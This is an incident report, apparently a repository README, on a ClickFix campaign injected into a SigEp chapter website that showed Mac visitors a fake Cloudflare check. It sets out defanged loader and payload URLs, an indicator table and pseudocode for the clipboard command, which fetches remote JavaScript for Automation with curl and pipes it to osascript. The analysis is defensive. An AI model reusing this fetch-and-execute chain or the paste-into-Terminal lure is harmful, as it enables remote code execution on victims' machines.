# The Cloudflare prompt that wanted a Mac terminal

![A fake Cloudflare Human Verification dialog instructing a Mac user to open Terminal, paste, and press Enter](assets/fake-cloudflare-clickfix.png)

On October 13, 2026, `johnshopkins.sigep.org` displayed this fake Cloudflare verification flow. The page told a Mac user to open Terminal, paste the clipboard, and press Enter. That sequence would have executed a remotely supplied JavaScript for Automation (JXA) payload under the user's account.

The command was **not executed**. This report is a static analysis of the page, its decoded browser script, and the clipboard command it generated. No final-stage payload was downloaded.

> **Safety:** The live commands and URLs in this repository are defanged or reduced to pseudocode. Do not visit the affected page or reconstruct and execute the command.

## What happened

The HTML response observed in Safari included this third-party script immediately before `</head>`:

```html
<script async src="hxxps://browse-veriid[.]beer/api.php?s=<campaign-key>&_v=<version>"></script>
```

That script decoded a second JavaScript program in memory and ran it with `new Function`. The decoded program:

1. reported the page URL, referrer, and a generated visitor UUID to its control server;
2. covered the page with a high-fidelity Cloudflare imitation;
3. blocked common developer-tool shortcuts and the context menu;
4. requested a victim-specific macOS command from the server;
5. attempted to place that command on the clipboard after the fake checkbox was clicked;
6. instructed the victim to open Terminal, paste, and press Enter; and
7. polled the server until the victim token was marked consumed, then displayed a fake success state.

```mermaid
sequenceDiagram
    participant V as Visitor
    participant S as Compromised SigEp page
    participant C as ClickFix server
    participant T as macOS Terminal
    participant P as Payload server

    V->>S: Load chapter website
    S->>C: Load injected JavaScript
    C-->>V: Fake Cloudflare overlay
    V->>V: Click fake checkbox
    C-->>V: Write command to clipboard
    V->>T: Paste and run, if deceived
    T->>C: Redeem victim token
    T->>P: Download JXA payload
    T->>T: Execute with osascript
    C-->>V: Show fake verification success
```

## What the pasted command did

The clipboard content used two Base64 layers. Decoding them without execution produced this behavior:

```text
GET hxxp://browse-veriid[.]beer/p/<victim-token>
if the response body is exactly "ok":
    GET hxxps://policysync[.]pro/<campaign-path>
    pipe the response to: osascript -l JavaScript
```

The final pipeline used `curl -sfL`, which hides output, fails on HTTP errors, and follows redirects. `osascript -l JavaScript` then interprets the response as JXA. At that point the remote server can supply arbitrary code with the permissions of the logged-in user.

The first request also appears to act as a one-time token redemption. In parallel, the fake browser overlay polls the control server for a `consumed` flag. This lets the web page react to successful Terminal execution and reassure the victim with a false “Verification complete” message.

## What is proven

- Safari loaded the injected script while displaying `https://johnshopkins.sigep.org/`.
- Reloading the SigEp page reproduced the malicious overlay during the observation window.
- The injected program implemented clipboard delivery, fake instructions, server polling, and an optional redirect.
- The supplied shell command led to remote JXA execution if pasted and run.
- The command was not executed, so the final JXA payload and its capabilities remain unknown.

The evidence does **not** identify how the website was compromised. The site used WordPress, but the injection could have come from a compromised theme, plugin, database value, tag manager, administrator account, hosting account, or server. Naming a specific entry point would be speculation.

## Indicators

| Indicator | Role |
| --- | --- |
| `browse-veriid.beer` | Injected JavaScript, visit telemetry, command delivery, and token polling |
| `policysync.pro` | Final JXA payload host referenced by the decoded command |
| `7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b` | Campaign key in the observed loader |
| `bw-cf-root` | DOM ID used by the fake verification overlay |
| `bw-cf-style` | DOM ID used by the injected stylesheet |

Both domains had contemporaneous ClickFix-related ThreatFox entries: [`browse-veriid.beer`](https://threatfox.abuse.ch/ioc/1961703/) and [`policysync.pro`](https://threatfox.abuse.ch/ioc/1961428/).

## Technique mapping

- [MITRE ATT&CK T1204.004 — Malicious Copy and Paste](https://attack.mitre.org/techniques/T1204/004/)
- [MITRE ATT&CK T1059.007 — JavaScript/JScript](https://attack.mitre.org/techniques/T1059/007/)
- [MITRE ATT&CK T1105 — Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)

Microsoft has documented the same broad macOS ClickFix pattern: a fake verification prompt asks the victim to paste an obfuscated command into Terminal, which then downloads and runs JXA. See [“macOS ClickFix campaign: Learned to hide”](https://www.microsoft.com/en-us/security/blog/2026/08/05/macos-clickfix-campaign-learned-hide/) and its broader [ClickFix analysis](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/).

## Repository contents

- [`analysis/technical-walkthrough.md`](analysis/technical-walkthrough.md) reconstructs the browser loader and victim flow.
- [`lab/firecracker-design.md`](lab/firecracker-design.md) proposes a contained, offline reproduction of the web layer.
- [`indicators.csv`](indicators.csv) contains the observed indicators in a machine-readable form.
- [`assets/fake-cloudflare-clickfix.png`](assets/fake-cloudflare-clickfix.png) is the original screenshot.

## Timeline

| Time | Event |
| --- | --- |
| 2026-10-13 19:02 PDT | Screenshot captured on the affected SigEp chapter page |
| 2026-10-13 | Page source, decoded browser code, and clipboard command analyzed without execution |
| 2026-10-13 | Reload reproduced the malicious page in Safari |
| Pending | Website owner notification and remediation confirmation |

Publication should follow owner notification and, ideally, confirmation that the injected script has been removed. The observation above only describes the site during the stated window.

